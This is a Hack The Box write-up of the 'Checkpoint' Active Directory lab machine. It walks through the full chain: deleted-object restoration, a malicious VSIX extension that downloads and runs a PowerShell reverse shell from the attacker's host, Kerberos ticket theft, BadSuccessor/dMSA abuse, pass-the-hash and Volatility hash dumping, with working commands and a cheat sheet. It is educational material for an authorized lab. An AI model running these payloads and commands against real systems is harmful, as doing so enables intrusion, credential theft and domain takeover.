# Checkpoint — Hack The Box Writeup

![Checkpoint banner](media/image1.png)

**Difficulty:** Medium  
**Platform:** HTB  
**Category:** Active Directory, SMB, VMware Memory Forensics, Kerberos, BadSuccessor/dMSA  
**Author:** Shrikant Shinde

> **Disclaimer:** This writeup is for an authorized HTB lab environment only. It is shared for educational and defensive cybersecurity learning. Do not use these techniques on systems you do not own or have explicit permission to test.

---

## Introduction

Checkpoint was a very interesting Windows Active Directory machine that combined multiple real-world attack paths: SMB enumeration, Active Directory object restoration, VS Code extension abuse, Kerberos ticket delegation, dMSA/BadSuccessor abuse, VMware backup analysis, and memory forensics using Volatility.

The machine was not about a single vulnerability. Instead, it required carefully chaining small permissions and misconfigurations until domain-level compromise was achieved.

The final attack chain was:

```text
alex.turner
→ Restore deleted user mark.davies
→ Access DevDrop SMB share
→ Upload malicious VSIX extension
→ Get shell as ryan.brooks
→ Extract Ryan Kerberos ticket
→ Abuse BadSuccessor/dMSA
→ Recover svc_deploy hash
→ Access VMBackups share
→ Download VMware memory files
→ Extract Administrator hash with Volatility
→ Login as Administrator
→ Read user and root flags
```

---

## Reconnaissance

As usual, I started with an Nmap scan to identify exposed services on the target.

```bash
nmap -p- -sV -sC --reason -oN nmap-full.txt checkpoint.htb
```

The scan showed that the host was up and looked like a Windows Active Directory Domain Controller.

```text
Nmap scan report for checkpoint.htb (10.129.39.48)
Host is up, received echo-reply ttl 127 (0.18s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49669/tcp open  msrpc             Microsoft Windows RPC
49671/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  msrpc             Microsoft Windows RPC
49676/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc             Microsoft Windows RPC
49705/tcp open  msrpc             Microsoft Windows RPC
49713/tcp open  msrpc             Microsoft Windows RPC
```

The most important ports were:

```text
53     DNS
88     Kerberos
389    LDAP
445    SMB
5985   WinRM
3268   Global Catalog LDAP
```

This confirmed that the machine was very likely a Domain Controller. Nmap also identified the host as:

```text
Host: DC01
Domain: checkpoint.htb
OS: Windows
```

![Nmap scan](media/image2.png)

At this point, the attack surface clearly pointed toward Active Directory enumeration. Since SMB, LDAP, Kerberos, and WinRM were exposed, I focused on domain permissions, shares, and Kerberos-based abuse paths.

---

## Initial Access as alex.turner

I started with valid credentials for the user `alex.turner`.

```bash
nxc smb 10.129.39.48 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!'
```

The authentication was successful:

```text
[+] checkpoint.htb\alex.turner:Checkpoint2024!
```

![Successful SMB login as alex.turner](media/image3.png)

At this point, I confirmed that the domain was `checkpoint.htb` and the target host was `DC01`.

---

## Enumerating Writable Active Directory Objects

Next, I used `bloodyAD` to check what objects `alex.turner` could write to.

```bash
bloodyad --host 10.129.39.48 --dns 10.129.39.48 -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get writable
```

Interesting output:

```text
distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE
```

The important finding here was that `alex.turner` had write access over the `Deleted Objects` container. This suggested that a deleted AD object might be restorable.

![bloodyAD writable permissions for alex.turner](media/image4.png)

---

## Restoring mark.davies

I restored the deleted user `mark.davies` using `bloodyAD`.

```bash
bloodyad --host 10.129.39.48 --dns 10.129.39.48 -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' set restore mark.davies
```

The restore was successful:

```text
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

![mark.davies restored successfully](media/image5.png)

Since the restored user reused the known password pattern, I tested SMB access using the NT hash of `Checkpoint2024!`.

First, I generated the NT hash:

```bash
python3 -c "from impacket.ntlm import compute_nthash; print(compute_nthash('Checkpoint2024!').hex())"
```

Output:

```text
0b28e49d9deb96f99d74578e214faec2
```

Then I checked SMB shares as `mark.davies`:

```bash
nxc smb 10.129.39.48 -d checkpoint.htb -u mark.davies \
  -H 0b28e49d9deb96f99d74578e214faec2 --shares
```

The interesting share was:

```text
DevDrop    READ,WRITE    VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
```

This share immediately stood out because it allowed write access and mentioned VS Code extensions.

![mark.davies access to DevDrop share](media/image6.png)

---

## Abusing DevDrop with a Malicious VSIX Extension

The `DevDrop` share allowed approved `.vsix` packages to be uploaded. A `.vsix` file is a Visual Studio Code extension package.

Since the share description mentioned VS Code extensions, I created a malicious extension that executed a PowerShell reverse shell during activation.

### Creating the VS Code Extension

On Kali:

```bash
mkdir -p checkpoint-vsix
cd checkpoint-vsix
npm init -y
npm install -g @vscode/vsce
```

I created a `package.json` file:

```json
{
  "name": "checkpoint-helper",
  "displayName": "Checkpoint Helper",
  "description": "Approved helper extension",
  "version": "1.0.0",
  "publisher": "checkpoint",
  "engines": {
    "vscode": "^1.118.0"
  },
  "categories": [
    "Other"
  ],
  "activationEvents": [
    "*"
  ],
  "main": "./extension.js"
}
```

Then I created `extension.js`:

```javascript
const vscode = require('vscode');
const { exec } = require('child_process');

function activate(context) {
  exec('powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://YOUR_TUN0_IP:8000/shell.ps1\')"');
}

function deactivate() {}

module.exports = {
  activate,
  deactivate
};
```

I replaced `YOUR_TUN0_IP` with my HTB VPN IP.

```bash
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
```

### Creating the PowerShell Reverse Shell

I created a simple PowerShell reverse shell payload and hosted it with Python.

```bash
mkdir -p /tmp/checkpoint-www
cd /tmp/checkpoint-www
nano shell.ps1
```

Payload:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("YOUR_TUN0_IP",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close()
```

Started the HTTP server:

```bash
python3 -m http.server 8000
```

Started a listener:

```bash
nc -lvnp 4444
```

### Building and Uploading the VSIX

Back in the extension directory:

```bash
vsce package
```

This generated a `.vsix` file.

I uploaded it to the `DevDrop` share:

```bash
smbclient //10.129.39.48/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!'
```

Inside `smbclient`:

```text
put checkpoint-helper-1.0.0.vsix
```

After the extension was processed, I received a shell as:

```text
checkpoint\ryan.brooks
```

![VSIX upload to DevDrop](media/image7.png)

![Reverse shell as ryan.brooks](media/image8.png)

---

## Extracting Ryan’s Kerberos Ticket

At this point, I had a shell as `ryan.brooks`, but I did not have Ryan’s password.

Instead of looking for the password, I extracted Ryan’s Kerberos ticket using Rubeus.

On the target:

```powershell
cd C:\Windows\Temp
.\Rubeus.exe tgtdeleg /nowrap
```

This returned a Base64-encoded Kerberos ticket.

![Rubeus tgtdeleg output](media/image9.png)

On Kali, I saved the Base64 ticket:

```bash
nano ryan.b64
```

Then converted it to `.kirbi`:

```bash
cat ryan.b64 | tr -d '\n\r\t ' | base64 -d > ryan.kirbi
```

Then converted it to a Linux ccache file:

```bash
impacket-ticketConverter ryan.kirbi ryan.brooks.ccache
```

I exported the ticket:

```bash
export KRB5CCNAME=$PWD/ryan.brooks.ccache
```

This allowed me to authenticate as Ryan using Kerberos without knowing his password.

---

## Enumerating Ryan’s AD Permissions

Using Ryan’s Kerberos ticket, I checked writable objects:

```bash
KRB5CCNAME=$PWD/ryan.brooks.ccache bloodyad \
  --host dc01.checkpoint.htb \
  --dns 10.129.39.48 \
  -d checkpoint.htb \
  -u ryan.brooks \
  -k \
  get writable
```

Important output:

```text
distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
permission: WRITE
```

This was the key privilege escalation point.

Ryan could create child objects in `OU=DMSAHolder` and had write access over the service account `svc_deploy`.

![Ryan writable permissions](media/image10.png)

---

## Abusing BadSuccessor / dMSA

The target supported dMSA abuse. The idea was to create a delegated managed service account that superseded or linked back to `svc_deploy`. This allowed extraction of the previous key for `svc_deploy`.

I used `bloodyAD`:

```bash
KRB5CCNAME=$PWD/ryan.brooks.ccache bloodyad \
  --host dc01.checkpoint.htb \
  --dns 10.129.39.48 \
  -d checkpoint.htb \
  -u ryan.brooks \
  -k \
  add badSuccessor EvilDMSA \
  -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
  --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
```

The command created the DMSA object but crashed after creation:

```text
[+] Creating DMSA EvilDMSA$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
TypeError: Cannot mix str and non-str arguments
```

Even though the tool crashed, the object was created successfully.

I confirmed it:

```bash
KRB5CCNAME=$PWD/ryan.brooks.ccache bloodyad \
  --host dc01.checkpoint.htb \
  --dns 10.129.39.48 \
  -d checkpoint.htb \
  -u ryan.brooks \
  -k \
  get search --filter "(cn=EvilDMSA)"
```

Important attributes:

```text
sAMAccountName: EvilDMSA$
msDS-ManagedAccountPrecededByLink: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
msDS-SupersededManagedAccountLinkBL: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
```

![EvilDMSA object linked to svc_deploy](media/image11.png)

![EvilDMSA object linked to svc_deploy](media/image12.png)

![EvilDMSA object linked to svc_deploy](media/image13.png)

![EvilDMSA object linked to svc_deploy](media/image14.png)

---

## Extracting the Previous Key with getDmsa.py

Since `bloodyAD` crashed before printing the useful key, I used `getDmsa.py` from `minikerberos`.

I installed it in a virtual environment:

```bash
cd /tmp
python3 -m venv mkvenv
source mkvenv/bin/activate
pip install -U pip
pip install git+https://github.com/skelsec/minikerberos.git
```

I found the script:

```bash
find /tmp/mkvenv -type f -iname 'getDmsa.py' 2>/dev/null
```

Output:

```text
/tmp/mkvenv/lib/python3.13/site-packages/minikerberos/examples/getDmsa.py
```

### Fixing Time Skew

Initially, I hit Kerberos clock skew errors:

```text
KRB_AP_ERR_SKEW Detail: "The clock skew is too great"
```

Kerberos is very sensitive to time, so I synced my Kali machine with the domain controller:

```bash
sudo ntpdate -b -u 10.129.39.48
```

After fixing the clock, I regenerated Ryan’s ticket using Rubeus and converted it again to ccache.

### Running getDmsa.py

I copied the ccache to a simple path:

```bash
cp ryan.brooks.ccache /tmp/ryan.ccache
cd /tmp
```

Then I ran:

```bash
python3 /tmp/mkvenv/lib/python3.13/site-packages/minikerberos/examples/getDmsa.py \
  'kerberos+ccache://CHECKPOINT.HTB\ryan.brooks:ryan.ccache@10.129.39.48' \
  'EvilDMSA$@CHECKPOINT.HTB'
```

This returned the current and previous keys:

```text
CURRENT KEYS:
  AES256: 02a92bfafdbf04520522ca52cb3f2209e94ca231ee5dfaea0e10955b1cf95e0d
  AES128: 4b3826da3ad87381dac82bb0423f61e3
  RC4: a6e6f2990dbc66e5bf1c1a769c299996

PREVIOUS KEYS:
  RC4: e16081eb077aca74bdbf8af12af43ac9
```

The important value was the previous RC4 key:

```text
e16081eb077aca74bdbf8af12af43ac9
```

This was the NTLM hash for `svc_deploy`.

![getDmsa.py showing previous RC4 key](media/image15.png)

---

## Accessing VMBackups as svc_deploy

I tested the hash:

```bash
nxc smb 10.129.39.48 -d checkpoint.htb -u svc_deploy \
  -H e16081eb077aca74bdbf8af12af43ac9 --shares
```

The authentication was successful, and `svc_deploy` had read access to `VMBackups`:

```text
VMBackups    READ
```

![svc_deploy access to VMBackups](media/image16.png)

I connected using `smbclient`:

```bash
smbclient //10.129.39.48/VMBackups \
  -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' \
  --pw-nt-hash
```

Inside the share:

```text
cd "NightlyBackup_2024-11-01"
cd "memory forensics"
ls
```

Important files:

```text
Windows Server 2019-Snapshot1.vmem    2147483648
Windows Server 2019-Snapshot1.vmsn    138164859
Windows Server 2019.vmx
Windows Server 2019.vmsd
```

![VMBackups memory forensics directory](media/image17.png)

---

## Downloading VMware Memory Files

For Volatility analysis, I needed both:

```text
Windows Server 2019-Snapshot1.vmem
Windows Server 2019-Snapshot1.vmsn
```

The `.vmem` file contains the VM memory, and the `.vmsn` file contains snapshot metadata required by Volatility to correctly parse the VMware memory image.

I downloaded the `.vmsn` first:

```text
get "Windows Server 2019-Snapshot1.vmsn" snapshot.vmsn
```

Then renamed it:

```bash
mv snapshot.vmsn "Windows Server 2019-Snapshot1.vmsn"
```

Then I downloaded the full `.vmem` file. It was around 2 GB, so I downloaded it separately instead of recursively downloading the full folder.

```text
get "Windows Server 2019-Snapshot1.vmem" snapshot.vmem
```

Then renamed it:

```bash
mv snapshot.vmem "Windows Server 2019-Snapshot1.vmem"
```

At the end, I had:

```text
Windows Server 2019-Snapshot1.vmem
Windows Server 2019-Snapshot1.vmsn
Windows Server 2019.vmsd
Windows Server 2019.vmx
```

![Final downloaded VMware files with sizes](media/image18.png)

---

## Extracting Administrator Hash with Volatility

I used Volatility 3 to analyze the memory image.

First, I checked the image information:

```bash
vol -f "Windows Server 2019-Snapshot1.vmem" windows.info
```

Output confirmed the OS:

```text
NtProductType   NtProductServer
NtMajorVersion  10
NtMinorVersion  0
Major/Minor     15.17763
NtSystemRoot    C:\Windows
```

![Volatility windows.info output](media/image19.png)

Then I dumped local account hashes:

```bash
vol -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump.Hashdump
```

Output:

```text
User                rid  lmhash                            nthash
Administrator       500  aad3b435b51404eeaad3b435b51404ee  f29e9c014295b9b32139b09a2790be3b
Guest               501  aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount      503  aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount  504  aad3b435b51404eeaad3b435b51404ee  28f8d934dee90b2ec824351cb0844479
```

The Administrator NTLM hash was:

```text
f29e9c014295b9b32139b09a2790be3b
```

![Volatility hashdump output](media/image20.png)

---

## Getting Administrator Shell

I tested the Administrator hash with `nxc`:

```bash
nxc smb 10.129.39.48 -d checkpoint.htb -u Administrator \
  -H f29e9c014295b9b32139b09a2790be3b --shares
```

Then I tested WinRM:

```bash
nxc winrm 10.129.39.48 -d checkpoint.htb -u Administrator \
  -H f29e9c014295b9b32139b09a2790be3b
```

After confirming WinRM access, I connected with Evil-WinRM:

```bash
evil-winrm -i 10.129.39.48 -u Administrator \
  -H f29e9c014295b9b32139b09a2790be3b
```

![Evil-WinRM Administrator shell](media/image21.png)

---

## Reading the Flags

The root flag was not on the Administrator desktop. I searched for it:

```powershell
Get-ChildItem C:\ -Recurse -Force -Filter root.txt -ErrorAction SilentlyContinue
```

It was located at:

```text
C:\Users\max.palmer\Desktop\root.txt
```

I read it:

```powershell
type C:\Users\max.palmer\Desktop\root.txt
```

![root.txt location](media/image22.png)

![read command](media/image23.png)

The user flag was located under Ryan’s profile, but the Administrator account did not initially have read access:

```powershell
type C:\Users\ryan.brooks\Desktop\user.txt
```

This returned:

```text
Access to the path is denied.
```

I checked the ACL:

```powershell
icacls C:\Users\ryan.brooks\Desktop\user.txt
```

Output:

```text
CHECKPOINT\ryan.brooks:(R)
CHECKPOINT\max.palmer:(F)
```

Since I had Administrator access, I took ownership and granted myself permission:

```powershell
takeown /F C:\Users\ryan.brooks\Desktop\user.txt
icacls C:\Users\ryan.brooks\Desktop\user.txt /grant "CHECKPOINT\Administrator:F"
type C:\Users\ryan.brooks\Desktop\user.txt
```

![Taking ownership of user.txt](media/image24.png)

---

## Key Lessons Learned

This machine had several important lessons:

### 1. Deleted AD objects can be dangerous

If a low-privileged user can restore deleted objects, that can reintroduce old accounts with useful permissions.

### 2. Writable SMB shares can lead to code execution

The `DevDrop` share was not just a file share. Because it accepted VS Code extensions, write access turned into code execution.

### 3. Passwords are not always needed

For Ryan, I did not need the password. A delegated Kerberos ticket was enough to continue the attack.

### 4. dMSA / BadSuccessor abuse is powerful

The ability to create a dMSA object and link it to a privileged service account allowed recovery of the previous key for `svc_deploy`.

### 5. Time synchronization matters in Kerberos

The `KRB_AP_ERR_SKEW` error was solved by syncing Kali’s time with the domain controller.

### 6. VMware memory snapshots need metadata

Volatility failed when only the `.vmem` file was available. The matching `.vmsn` file was required to correctly parse the memory image.

### 7. Memory forensics can lead to full compromise

The Administrator hash was recovered directly from the VMware memory snapshot using Volatility.

---

## Final Attack Path Summary

1. Authenticated as `alex.turner`
2. Found writable Deleted Objects container
3. Restored `mark.davies`
4. Used `mark.davies` to access `DevDrop`
5. Uploaded malicious VS Code extension
6. Received shell as `ryan.brooks`
7. Extracted Ryan Kerberos ticket with Rubeus
8. Found Ryan could create dMSA and write `svc_deploy`
9. Created `EvilDMSA` using BadSuccessor
10. Extracted `svc_deploy` previous RC4 key
11. Accessed `VMBackups`
12. Downloaded VMware memory files
13. Extracted Administrator hash with Volatility
14. Logged in with Evil-WinRM
15. Read user and root flags

---

## Commands Cheat Sheet

```bash
# Check SMB access
nxc smb 10.129.39.48 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!'

# Check writable AD objects
bloodyad --host 10.129.39.48 --dns 10.129.39.48 -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get writable

# Restore deleted user
bloodyad --host 10.129.39.48 --dns 10.129.39.48 -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' set restore mark.davies

# Compute NT hash
python3 -c "from impacket.ntlm import compute_nthash; print(compute_nthash('Checkpoint2024!').hex())"

# Enumerate shares as mark.davies
nxc smb 10.129.39.48 -d checkpoint.htb -u mark.davies \
  -H 0b28e49d9deb96f99d74578e214faec2 --shares

# Use Ryan Kerberos ticket
export KRB5CCNAME=$PWD/ryan.brooks.ccache

# Ryan writable objects
bloodyad --host dc01.checkpoint.htb --dns 10.129.39.48 \
  -d checkpoint.htb -u ryan.brooks -k get writable

# BadSuccessor
bloodyad --host dc01.checkpoint.htb --dns 10.129.39.48 \
  -d checkpoint.htb -u ryan.brooks -k \
  add badSuccessor EvilDMSA \
  -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
  --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"

# Extract dMSA previous key
python3 getDmsa.py \
  'kerberos+ccache://CHECKPOINT.HTB\ryan.brooks:ryan.ccache@10.129.39.48' \
  'EvilDMSA$@CHECKPOINT.HTB'

# Test svc_deploy
nxc smb 10.129.39.48 -d checkpoint.htb -u svc_deploy \
  -H e16081eb077aca74bdbf8af12af43ac9 --shares

# Connect to VMBackups
smbclient //10.129.39.48/VMBackups \
  -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' \
  --pw-nt-hash

# Volatility analysis
vol -f "Windows Server 2019-Snapshot1.vmem" windows.info
vol -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump.Hashdump

# Evil-WinRM as Administrator
evil-winrm -i 10.129.39.48 -u Administrator \
  -H f29e9c014295b9b32139b09a2790be3b
```

---

## Conclusion

Checkpoint was a strong Active Directory machine because it forced me to combine enumeration, AD permissions analysis, Kerberos abuse, dMSA/BadSuccessor, SMB share abuse, and memory forensics.

The most important part was not any single tool. The key was understanding why each permission mattered and how one identity led to the next.

This was one of those boxes where every step unlocked just enough access to move forward.
